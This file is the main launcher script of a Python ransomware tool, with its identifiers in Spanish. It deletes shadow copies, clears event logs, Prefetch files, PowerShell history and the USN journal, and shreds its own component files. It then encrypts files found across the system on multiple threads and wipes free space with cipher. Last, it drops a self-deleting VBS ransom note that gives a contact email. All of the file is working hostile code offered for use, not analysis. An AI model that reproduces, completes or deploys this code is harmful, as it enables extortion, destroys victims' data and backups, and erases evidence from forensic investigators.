import os
import sys
import time
import threading
import shutil
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

if getattr(sys, 'frozen', False):
    SCRIPT_DIR = os.path.dirname(sys.executable)
else:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

os.chdir(SCRIPT_DIR)


def pre_cleanup():
    try:
        subprocess.run(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], capture_output=True, creationflags=0x08000000)
        subprocess.run(['wmic', 'shadowcopy', 'delete'], capture_output=True, creationflags=0x08000000)
        subprocess.run(['powercfg', '-h', 'off'], capture_output=True, creationflags=0x08000000)
        subprocess.run([
            'reg', 'add',
            r'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management',
            '/v', 'ClearPageFileAtShutdown',
            '/t', 'REG_DWORD',
            '/d', '1',
            '/f'
        ], capture_output=True, creationflags=0x08000000)
        os.system('powershell -w h -nop -c "Remove-Item C:\\Windows\\Prefetch\\*.pf -Force" 2>nul')
        os.system('wevtutil cl Application 2>nul')
        os.system('wevtutil cl System 2>nul')
        os.system('wevtutil cl Security 2>nul')
        ps_history = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt')
        if os.path.exists(ps_history):
            open(ps_history, 'w').close()
        for drive in ['C:', 'D:', 'E:', 'F:']:
            if os.path.exists(drive):
                os.system(f'fsutil usn deletejournal /D {drive} 2>nul')
        os.system('reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache" /f 2>nul')
        import ctypes
        ctypes.windll.psapi.EmptyWorkingSet(-1)
    except:
        pass


def auto_destruir_archivos():
    archivos = ['evasion_av.py', 'rutas.py', 'encriptador_12_capas.py', 'launcher.py', 'launcher.bat', 'launcher.sh']
    for f in archivos:
        if os.path.exists(f):
            try:
                size = os.path.getsize(f)
                for pattern in [b'\\x00', b'\\xFF', os.urandom(size)]:
                    with open(f, 'wb') as fw:
                        if isinstance(pattern, bytes) and len(pattern) == 1:
                            fw.write(pattern * size)
                        else:
                            fw.write(pattern)
                        fw.flush()
                        os.fsync(fw.fileno())
                os.remove(f)
            except:
                pass


def cleanup_python_thread():
    time.sleep(300)
    try:
        if os.path.exists('python_portable'):
            shutil.rmtree('python_portable')
    except:
        pass


def wipe_memory_aggressive():
    try:
        junk = [os.urandom(10 * 1024 * 1024) for _ in range(50)]
        del junk
        import gc
        for _ in range(10):
            gc.collect()
        more_junk = [bytearray(5 * 1024 * 1024) for _ in range(30)]
        del more_junk
        gc.collect()
    except:
        pass


def mostrar_mensaje_final():
    try:
        vbs_content = """On Error Resume Next
MsgBox "Your files have been encrypted. Contact: onder01@tutamail.com", vbCritical + vbSystemModal, "Encrypted"
Dim fso, scriptPath
Set fso = CreateObject("Scripting.FileSystemObject")
scriptPath = WScript.ScriptFullName
WScript.Sleep 3000
On Error Resume Next
fso.DeleteFile scriptPath, True
WScript.Quit
"""
        vbs_path = os.path.join(os.environ.get('TEMP', ''), f'~{os.getpid()}.vbs')
        with open(vbs_path, 'w', encoding='utf-8') as f:
            f.write(vbs_content)
        subprocess.Popen(['wscript.exe', vbs_path], creationflags=0x08000000, shell=False)
    except:
        pass


try:
    from evasion_av import verificar_seguridad_total
except:
    verificar_seguridad_total = lambda: True

try:
    from rutas import escanear_sistema
    from encriptador_12_capas import EncriptadorMilitar
except ImportError:
    sys.exit(1)


def encriptar_archivo(enc, ruta):
    try:
        result = enc.encriptar(ruta)
        if result:
            try:
                dirname = os.path.dirname(ruta)
                subprocess.Popen(['cipher', '/w:' + dirname], creationflags=0x08000000)
            except:
                pass
        return result
    except:
        return False


def main():
    try:
        pre_cleanup()
        threading.Thread(target=cleanup_python_thread, daemon=True).start()
        os.chdir(SCRIPT_DIR)
        archivos, _, _ = escanear_sistema()
        enc = EncriptadorMilitar()
        auto_destruir_archivos()
        NUM_THREADS = 10
        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
            futures = {executor.submit(encriptar_archivo, enc, ruta): ruta for ruta in archivos}
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
        mostrar_mensaje_final()
        wipe_memory_aggressive()
        pre_cleanup()
    except:
        pass


if __name__ == "__main__":
    main()
